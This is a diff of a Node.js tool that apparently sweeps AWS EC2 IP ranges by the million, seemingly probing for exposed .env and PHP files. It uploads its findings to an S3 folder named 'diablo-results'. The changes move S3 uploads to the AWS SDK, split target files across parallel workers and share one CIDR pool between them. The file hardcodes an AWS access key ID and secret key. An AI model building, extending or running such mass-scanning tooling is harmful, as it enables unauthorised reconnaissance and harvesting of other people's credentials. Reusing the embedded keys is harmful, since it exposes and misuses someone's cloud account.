@@ -19,6 +19,7 @@ const { Worker, isMainThread, parentPort, workerData, threadId } = require('work
 // ─── External deps ────────────────────────────────────────────
 const axios = require('axios');
 const cheerio = require('cheerio');
+const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');
 
 // ================================================================
 // CONFIG — carica da pack.json
@@ -52,8 +53,6 @@ const S3_FOLDER = 'diablo-results';
 const S3_REGION = 'eu-north-1';
 const S3_ACCESS_KEY = 'AKIAW3MEAPS545FBGS5I';
 const S3_SECRET_KEY = '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';
-const S3_HOST = `s3.${S3_REGION}.amazonaws.com`;
-
 // --- Bunny Config ---
 const BUNNY_STORAGE_URL = '';
 const BUNNY_API_KEY = '';
@@ -64,7 +63,7 @@ const LOAD_FROM_CIDR = true;
 const USE_REV = false;
 
 // --- Performance ---
-const MAX_SITE_BATCH = 3;
+const MAX_SITE_BATCH = 5;
 const MAX_LIST_ENV = 20;
 const MAX_LIST_PHP = 20;
 const DNS_WORKERS_EC2 = 100;
@@ -77,6 +76,11 @@ const NUM_WORKERS = 5;
 const MIN_CIDR_IPS = 1_000_000;
 
 // ─── Derived constants ─────────────────────────────────────────
+const s3Client = new S3Client({
+  region: S3_REGION,
+  credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
+  forcePathStyle: false,
+});
 const RESULT_DIR = path.join(DATA_DIR, 'risultati');
 const NEW_PATH_EXTRACT = path.join(RESULT_DIR, 'DATA_SPLIT');
 const SITE_DIR = path.join(DATA_DIR, 'site');
@@ -133,191 +137,70 @@ class TeeLogger {
 }
 
 // ================================================================
-// AWS SIGV4 HELPERS
-// ================================================================
-function awsSign(key, msg) {
-  return crypto.createHmac('sha256', key).update(msg).digest();
-}
-
-function awsSigV4Headers(bucket, s3key, payload) {
-  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
-  const dateStamp = amzDate.slice(0, 8);
-  const service = 's3';
-  const algorithm = 'AWS4-HMAC-SHA256';
-
-  const canonicalUri = '/' + s3key;
-  const payloadHash = crypto.createHash('sha256').update(payload).digest('hex');
-
-  const canonicalHeaders = [
-    `host:${bucket}.${S3_HOST}`,
-    `x-amz-content-sha256:${payloadHash}`,
-    `x-amz-date:${amzDate}`,
-  ].join('\n') + '\n';
-  const signedHeaders = 'host;x-amz-content-sha256;x-amz-date';
-
-  const canonicalRequest = [
-    'PUT',
-    canonicalUri,
-    '',
-    canonicalHeaders,
-    signedHeaders,
-    payloadHash,
-  ].join('\n');
-
-  const credentialScope = `${dateStamp}/${S3_REGION}/${service}/aws4_request`;
-  const stringToSign = [
-    algorithm,
-    amzDate,
-    credentialScope,
-    crypto.createHash('sha256').update(canonicalRequest).digest('hex'),
-  ].join('\n');
-
-  const kDate = awsSign(Buffer.from('AWS4' + S3_SECRET_KEY), dateStamp);
-  const kRegion = awsSign(kDate, S3_REGION);
-  const kService = awsSign(kRegion, service);
-  const kSigning = awsSign(kService, 'aws4_request');
-  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');
-
-  const auth = `${algorithm} Credential=${S3_ACCESS_KEY}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;
-
-  return {
-    'Host': `${bucket}.${S3_HOST}`,
-    'x-amz-date': amzDate,
-    'x-amz-content-sha256': payloadHash,
-    'Authorization': auth,
-    'Content-Type': 'application/octet-stream',
-    'Content-Length': String(payload.byteLength),
-  };
-}
-
-// ================================================================
-// S3 INDEX APPEND (with optimistic locking)
-// ================================================================
-async function appendToS3Index(s3KeyFull) {
-  const indexKey = `${S3_FOLDER}/index.txt`;
-  const urlIdx = `https://${S3_BUCKET}.${S3_HOST}/${indexKey}`;
-
-  for (let attempt = 0; attempt < 5; attempt++) {
-    try {
-      if (attempt === 0) await sleep(300 + Math.random() * 1200);
-
-      const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
-      const dateStamp = amzDate.slice(0, 8);
-      const credentialScope = `${dateStamp}/${S3_REGION}/s3/aws4_request`;
-
-      const canonicalHeadersGet = [
-        `host:${S3_BUCKET}.${S3_HOST}`,
-        `x-amz-content-sha256:UNSIGNED-PAYLOAD`,
-        `x-amz-date:${amzDate}`,
-      ].join('\n') + '\n';
-      const signedHeadersGet = 'host;x-amz-content-sha256;x-amz-date';
-      const canonicalRequestGet = [
-        'GET',
-        `/${indexKey}`,
-        '',
-        canonicalHeadersGet,
-        signedHeadersGet,
-        'UNSIGNED-PAYLOAD',
-      ].join('\n');
-      const stringToSignGet = [
-        'AWS4-HMAC-SHA256',
-        amzDate,
-        credentialScope,
-        crypto.createHash('sha256').update(canonicalRequestGet).digest('hex'),
-      ].join('\n');
-
-      const kDate = awsSign(Buffer.from('AWS4' + S3_SECRET_KEY), dateStamp);
-      const kRegion = awsSign(kDate, S3_REGION);
-      const kService = awsSign(kRegion, 's3');
-      const kSigning = awsSign(kService, 'aws4_request');
-      const sigGet = crypto.createHmac('sha256', kSigning).update(stringToSignGet).digest('hex');
-
-      const getHeaders = {
-        'Host': `${S3_BUCKET}.${S3_HOST}`,
-        'x-amz-date': amzDate,
-        'x-amz-content-sha256': 'UNSIGNED-PAYLOAD',
-        'Authorization': `AWS4-HMAC-SHA256 Credential=${S3_ACCESS_KEY}/${credentialScope}, SignedHeaders=${signedHeadersGet}, Signature=${sigGet}`,
-      };
-
-      const resGet = await ax.get(urlIdx, { headers: getHeaders, timeout: 10000 });
-      let existing = '';
-      let currentEtag = null;
-
-      if (resGet.status === 200) {
-        existing = typeof resGet.data === 'string' ? resGet.data : '';
-        currentEtag = (resGet.headers.etag || '').replace(/"/g, '');
-      }
-
-      const newContent = existing + s3KeyFull + '\n';
-      const idxPayload = Buffer.from(newContent, 'utf8');
-
-      const putHeaders = awsSigV4Headers(S3_BUCKET, indexKey, idxPayload);
-      putHeaders['Content-Type'] = 'text/plain';
-      if (currentEtag) putHeaders['If-Match'] = `"${currentEtag}"`;
-
-      const resPut = await ax.put(urlIdx, { headers: putHeaders, data: idxPayload, timeout: 10000 });
-
-      if ([200, 201].includes(resPut.status)) return;
-      if (resPut.status === 412) { await sleep(500 * Math.pow(2, attempt)); continue; }
-      await sleep(1000);
-    } catch (e) {
-      await sleep(1000);
-    }
-  }
-}
-
-// ================================================================
-// S3 UPLOAD
+// S3 UPLOAD (via AWS SDK — nessuna SigV4 manuale)
 // ================================================================
 async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
   if (!AWS_S3) return false;
   const s3key = `${S3_FOLDER}/${remotePath}`;
-  let lastError = null;
 
   for (let attempt = 0; attempt < maxRetries; attempt++) {
     try {
       log(`[S3 UPLOAD] ${localPath} -> s3://${S3_BUCKET}/${s3key} (${attempt + 1}/${maxRetries})`);
-      const payload = await fs.promises.readFile(localPath);
-      const headers = awsSigV4Headers(S3_BUCKET, s3key, payload);
-      const url = `https://${S3_BUCKET}.${S3_HOST}/${s3key}`;
-      const res = await ax.put(url, { headers, data: payload, timeout: 30000 });
-
-      if ([200, 201].includes(res.status)) {
-        log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
-        appendToS3Index(s3key).catch(() => {});
-        return true;
-      }
-      if (res.status === 429) {
-        const wait = Math.pow(2, attempt);
-        log(`[S3 UPLOAD] Rate limited (429), retry in ${wait}s`);
-        await sleep(wait * 1000);
-        lastError = '429 Rate Limited';
-      } else if (res.status >= 500) {
-        const wait = Math.pow(2, attempt);
-        log(`[S3 UPLOAD] Server error ${res.status}, retry in ${wait}s`);
-        await sleep(wait * 1000);
-        lastError = `Status ${res.status}`;
-      } else {
-        log(`[S3 UPLOAD] Error ${s3key}: Status ${res.status}`);
-        return false;
-      }
+      const body = await fs.promises.readFile(localPath);
+      await s3Client.send(new PutObjectCommand({
+        Bucket: S3_BUCKET,
+        Key: s3key,
+        Body: body,
+      }));
+      log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
+      appendToS3Index(s3key).catch(() => {});
+      return true;
     } catch (e) {
-      lastError = e.message;
-      if (attempt < maxRetries - 1) {
+      const msg = e.message || String(e);
+      if (msg.includes('429') || msg.includes('Throttling')) {
         const wait = Math.pow(2, attempt);
-        log(`[S3 UPLOAD] Exception ${s3key}: ${e.message}, retry in ${wait}s`);
+        log(`[S3 UPLOAD] Rate limited, retry in ${wait}s`);
+        await sleep(wait * 1000);
+      } else if (msg.includes('5')) {
+        const wait = Math.pow(2, attempt);
+        log(`[S3 UPLOAD] Server error, retry in ${wait}s: ${msg}`);
         await sleep(wait * 1000);
       } else {
-        log(`[S3 UPLOAD] FAILED ${s3key}: ${e.message}`);
+        log(`[S3 UPLOAD] Error ${s3key}: ${msg}`);
+        return false;
       }
     }
   }
-  if (lastError) {
-    try {
-      await fs.promises.appendFile(path.join(RESULT_DIR, 'err.log'), `Error S3 (${s3key}): ${lastError}\n`);
-    } catch (_) {}
-  }
   return false;
+}
+
+async function appendToS3Index(s3KeyFull) {
+  const indexKey = `${S3_FOLDER}/index.txt`;
+  for (let attempt = 0; attempt < 3; attempt++) {
+    try {
+      let existing = '';
+      try {
+        const getRes = await s3Client.send(new GetObjectCommand({
+          Bucket: S3_BUCKET,
+          Key: indexKey,
+        }));
+        existing = (await getRes.Body.transformToString()) || '';
+      } catch (e) {
+        if (!e.name || e.name !== 'NoSuchKey') throw e;
+      }
+
+      const newContent = existing + s3KeyFull + '\n';
+      await s3Client.send(new PutObjectCommand({
+        Bucket: S3_BUCKET,
+        Key: indexKey,
+        Body: Buffer.from(newContent, 'utf8'),
+        ContentType: 'text/plain',
+      }));
+      return;
+    } catch (e) {
+      await sleep(1000 * (attempt + 1));
+    }
+  }
 }
 
 async function uploadLogToS3() {
@@ -511,7 +394,7 @@ async function reverseIpLookup(ip) {
 // ================================================================
 // SITE FILE LOADER
 // ================================================================
-async function loadSitesFromFolder() {
+async function loadSitesFromFolder(workerId, numWorkers) {
   if (!LOAD_FROM_SITE) return { targets: [], filepath: null };
 
   try { await fs.promises.access(SITE_DIR); } catch (_) {
@@ -525,7 +408,11 @@ async function loadSitesFromFolder() {
 
   if (files.length === 0) return { targets: [], filepath: null };
 
-  const filename = files[0];
+  // Ogni worker prende il proprio file: worker 0 -> files[0], worker 1 -> files[1], etc.
+  const myIdx = workerId;
+  if (myIdx >= files.length) return { targets: [], filepath: null };
+
+  const filename = files[myIdx];
   const filepath = path.join(SITE_DIR, filename);
   let targets = [];
 
@@ -543,7 +430,7 @@ async function loadSitesFromFolder() {
     return { targets: [], filepath };
   }
 
-  log(`[SITE] ${filename}: ${targets.length} targets loaded`);
+  log(`[SITE] Worker ${workerId} — ${filename}: ${targets.length} targets loaded`);
   return { targets, filepath };
 }
 
@@ -1102,29 +989,29 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
 // ================================================================
 // MAIN — WORKER LOOP
 // ================================================================
+
+// Pool CIDR condiviso (costruito una volta sola)
+let cidrPoolShared = null;
+
+async function initCidrPool() {
+  if (!LOAD_FROM_CIDR) return null;
+  try {
+    const awsData = await fetchAwsIps();
+    const ec2Cidrs = getEc2Cidrs(awsData);
+    if (ec2Cidrs.length === 0) {
+      log('[SYS] No EC2 CIDRs found.');
+      return null;
+    }
+    log(`[SYS] Found ${ec2Cidrs.length} EC2 CIDRs. Building pool...`);
+    return buildCidrPool(ec2Cidrs);
+  } catch (e) {
+    log(`[SYS] ERROR fetching AWS IPs: ${e.message}`);
+    return null;
+  }
+}
+
 async function workerLoop(workerId) {
   let cycle = 0;
-  let cidrPool = null;
-
-  if (LOAD_FROM_CIDR) {
-    try {
-      const awsData = await fetchAwsIps();
-      const ec2Cidrs = getEc2Cidrs(awsData);
-      if (ec2Cidrs.length === 0) {
-        log('[SYS] No EC2 CIDRs found.');
-      } else {
-        log(`[SYS] Found ${ec2Cidrs.length} EC2 CIDRs. Building pool...`);
-        cidrPool = buildCidrPool(ec2Cidrs);
-      }
-    } catch (e) {
-      log(`[SYS] ERROR fetching AWS IPs: ${e.message}`);
-    }
-  }
-
-  if (LOAD_FROM_CIDR && !cidrPool) {
-    log('[SYS] ERROR: LOAD_FROM_CIDR=true but no CIDRs available. Exiting.');
-    return;
-  }
 
   while (true) {
     cycle++;
@@ -1133,7 +1020,7 @@ async function workerLoop(workerId) {
     if (LOAD_FROM_SITE) {
       let filesProcessed = 0;
       while (true) {
-        const { targets, filepath } = await loadSitesFromFolder();
+        const { targets, filepath } = await loadSitesFromFolder(workerId, NUM_WORKERS);
         if (targets.length === 0) {
           if (filesProcessed > 0) {
             log(`[SITE] Worker ${workerId} — All files processed (${filesProcessed} files).`);
@@ -1151,8 +1038,8 @@ async function workerLoop(workerId) {
     }
 
     // Phase CIDR
-    if (LOAD_FROM_CIDR && cidrPool) {
-      await gatherAndScanCycle(cidrPool, workerId, NUM_WORKERS, cycle);
+    if (LOAD_FROM_CIDR && cidrPoolShared) {
+      await gatherAndScanCycle(cidrPoolShared, workerId, NUM_WORKERS, cycle);
       log(`[W${workerId}] Cycle #${cycle} completed.`);
     }
 
@@ -1209,6 +1096,13 @@ async function main() {
 
   log(`[SYS] Starting ${NUM_WORKERS} worker(s)`);
   startLogUploadLoop();
+
+  // Costruisci pool CIDR una volta sola (condiviso tra tutti i worker)
+  cidrPoolShared = await initCidrPool();
+  if (LOAD_FROM_CIDR && !cidrPoolShared) {
+    log('[SYS] ERROR: LOAD_FROM_CIDR=true but no CIDRs available. Exiting.');
+    return;
+  }
 
   const workers = [];
   for (let w = 0; w < NUM_WORKERS; w++) {
